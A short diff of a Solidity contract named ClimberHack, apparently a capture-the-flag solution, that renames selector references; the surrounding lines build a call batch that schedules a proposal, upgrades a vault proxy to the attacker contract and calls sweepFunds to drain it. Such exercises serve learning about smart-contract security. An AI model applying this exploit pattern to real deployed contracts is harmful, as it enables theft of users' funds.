@@ -144,7 +144,7 @@ contract ClimberHack is UUPSUpgradeable {
         targets[2] = address(this);
         values[2] = 0;
         dataElements[2] = abi.encodeWithSelector(
-            ClimberExploit.scheduleProposal.selector
+            ClimberHack.scheduleProposal.selector
         );
 
         // Upgrade the Proxy to use this contract as implementation instead.
@@ -159,7 +159,7 @@ contract ClimberHack is UUPSUpgradeable {
         targets[4] = address(vaultProxyAddress);
         values[4] = 0;
         dataElements[4] = abi.encodeWithSelector(
-            ClimberExploit.sweepFunds.selector
+            ClimberHack.sweepFunds.selector
         );
 
         return (targets, values, dataElements);
